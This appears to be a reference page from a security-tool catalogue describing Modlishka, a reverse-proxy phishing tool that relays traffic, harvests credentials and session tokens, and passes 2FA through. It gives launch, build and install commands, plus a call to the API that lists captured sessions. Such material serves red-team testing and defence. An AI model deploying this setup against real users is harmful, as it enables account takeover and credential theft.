# Modlishka — Reverse-Proxy Phishing with 2FA Pass-Through

AiTM phishing proxy with multi-domain support, automatic 2FA pass-through, and credential harvesting via reverse proxy.

## How It Works

Modlishka acts as a transparent reverse proxy between victim and target service. Unlike Evilginx, it proxies all traffic — not just login pages — making it harder to detect and better suited for automated 2FA passthrough.

**Key features:**
- Multi-domain phishing support (proxy multiple targets simultaneously)
- Credential and session token harvesting via pattern matching
- Automatic 2FA/pass-through (MFA tokens flow through proxy)
- Cross-domain request handling and rewriting
- REST API for campaign management
- Tracking pixel support for analytics

**Architecture:** NGINX-style config. Each "domain profile" defines target URL, content rewriting rules, credential extraction regex, and session cookie capture rules.

## Manual

```bash
# Edit config
cp examples/config.json myconfig.json
# Set target domain, phishing domain, SSL cert

# Start Modlishka
./modlishka -config myconfig.json

# Or CLI flags
./modlishka -phishingDomain phishing.com \
  -targetDomain target.com \
  -targetRes https://target.com \
  -outputDir ./output \
  -trackingParam id \
  -terminateTriggers "id=logout"

# REST API (if enabled)
curl https://phishing.com/api/sessions
```

## Build

```bash
git clone https://github.com/drk1wi/Modlishka.git
cd Modlishka
go build -o modlishka .
```

## Install

```bash
# Download from GitHub releases
wget https://github.com/drk1wi/Modlishka/releases/latest/download/modlishka-linux-amd64.tar.gz
tar xzf modlishka-linux-amd64.tar.gz

# Build from source (Go required)
go get -u github.com/drk1wi/Modlishka
```

## Package

Prebuilt binaries on GitHub releases for Linux. Also available as Docker image build from source.

## Links

| Resource | URL |
|----------|-----|
| GitHub | https://github.com/drk1wi/Modlishka |
| Docs | https://github.com/drk1wi/Modlishka/wiki |
| Config examples | https://github.com/drk1wi/Modlishka/tree/master/examples |
| Blog | https://drk1wi.github.io/Modlishka/ |
